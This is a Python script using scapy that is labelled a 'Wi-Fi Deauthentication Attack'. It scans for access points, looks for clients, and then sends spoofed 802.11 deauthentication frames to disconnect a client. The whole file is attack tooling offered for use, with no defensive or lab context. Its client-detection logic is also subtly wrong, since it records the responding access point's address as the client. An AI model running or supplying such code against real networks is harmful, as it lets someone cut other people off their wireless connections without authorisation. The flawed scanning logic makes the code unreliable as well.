from scapy.all import *
import argparse
import warnings

# Suppress deprecation warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

def scan_for_aps(interface):
    print("Scanning for Access Points...")
    aps = []
    
    def sniff_ap(pkt):
        if pkt.haslayer(Dot11Beacon):
            ap_mac = pkt[Dot11].addr2
            if ap_mac not in aps:
                aps.append(ap_mac)
                print(f"Discovered AP: {ap_mac}")
        else:
            print("Received non-Beacon packet:", pkt.summary())
    
    try:
        sniff(iface=interface, prn=sniff_ap, timeout=30, count=0)
    except Exception as e:
        print(f"Error during sniffing: {e}")
    
    if not aps:
        print("No Access Points found.")
    return aps

def scan_for_clients(interface, ap_mac):
    print(f"Scanning for clients connected to AP: {ap_mac}")
    clients = []
    
    def sniff_client(pkt):
        if pkt.haslayer(Dot11ProbeResp) and pkt[Dot11].addr3 == ap_mac:
            client_mac = pkt[Dot11].addr2
            if client_mac not in clients:
                clients.append(client_mac)
                print(f"Discovered Client: {client_mac}")
        else:
            print("Received non-ProbeResp packet:", pkt.summary())
    
    try:
        sniff(iface=interface, prn=sniff_client, timeout=30, count=0)
    except Exception as e:
        print(f"Error during sniffing: {e}")
    
    if not clients:
        print(f"No clients found connected to AP {ap_mac}.")
    return clients

def deauth_packet(ap_mac, client_mac):
    packet = RadioTap()/Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
    return packet

def send_deauth_packets(interface, ap_mac, client_mac, count):
    packet = deauth_packet(ap_mac, client_mac)
    print(f"Sending {count} deauthentication packets to {client_mac}...")
    try:
        sendp(packet, iface=interface, count=count, inter=0.1)
    except Exception as e:
        print(f"Error sending packets: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wi-Fi Deauthentication Attack")
    parser.add_argument("-i", "--interface", required=True, help="Network interface in monitor mode")
    args = parser.parse_args()

    interface = args.interface

    aps = scan_for_aps(interface)
    if not aps:
        exit()

    ap_mac = aps[0]

    clients = scan_for_clients(interface, ap_mac)
    if not clients:
        exit()

    client_mac = clients[0]

    send_deauth_packets(interface, ap_mac, client_mac, 10)
